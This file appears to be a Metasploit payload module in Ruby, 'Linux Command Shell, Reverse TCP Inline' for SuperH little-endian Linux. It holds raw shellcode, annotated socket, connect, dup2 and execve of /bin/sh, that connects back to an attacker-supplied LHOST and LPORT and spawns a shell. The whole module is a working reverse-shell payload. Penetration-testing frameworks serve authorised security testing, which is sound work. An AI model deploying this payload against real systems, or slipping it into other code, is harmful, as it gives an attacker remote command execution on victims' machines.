##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  #CachedSize = 184

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        =>
        [
          'Shelby Pace'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_SHLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
          {
            'LHOST' =>  [ 57, 'ADDR' ],
            'LPORT' =>  [ 55, 'v' ]
          },
          'Payload' =>
            "\x55\xe3" + # socket()
            "\x08\x43" +
            "\x02\xe4" +
            "\x01\xe5" +
            "\x6a\x26" +
            "\x13\xc3" +
            "\x02\x73" + # connect()
            "\x03\x64" +
            "\x08\xc7" +
            "\x03\x65" +
            "\x10\xe6" +
            "\x13\xc3" +
            "\x09\x00" + # dup2()
            "\x3f\xe3" +
            "\x5a\x25" +
            "\x13\xc3" +
            "\x01\x75" +
            "\x53\x60" +
            "\x03\x88" +
            "\xfa\x8b" +
            "\x0b\xe3" + # execve()
            "\x04\xc7" +
            "\x03\x64" +
            "\x5a\x25" +
            "\x6a\x26" +
            "\x13\xc3" +
            "\x02\x00" +
            "\x11\x5c" +
            "\x0a\x00" +
            "\x02\x02" +
            "\x2f\x62" +
            "\x69\x6e" +
            "\x2f\x73" +
            "\x68\x00"
        })
    )
  end
end
